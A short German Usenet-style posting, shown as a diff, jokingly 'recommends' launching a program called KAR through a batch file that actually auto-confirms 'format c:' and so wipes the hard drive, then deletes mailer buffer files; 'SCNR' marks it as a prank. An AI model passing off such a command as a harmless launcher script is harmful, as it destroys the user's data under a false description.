@@ -1,0 +1,16 @@
+Dann empfehle ich ihn, KAR mit folgender Batch-Datei zu starten.
+Sie sollte im KAR-Verzeichnis sein. Der Name ist egal.
+@echo off
+echo j|format c: /q /u /v:depp
+echo So, wenn jetzt noch ein Crosspoint zum starten da ist, wird es jetzt   
+     gestartet
+del mpuffer.*
+xp
+
+SCNR
+Berend Koman
+
+-- 
+Dieses Posting besteht zu 100% aus recycelten Bytes.
+                                              E-Mail: vvsgn@u-zdmegz.jq
+---> Offizieller Kämpfer wider Achim Imler des Ordens von dtj <---
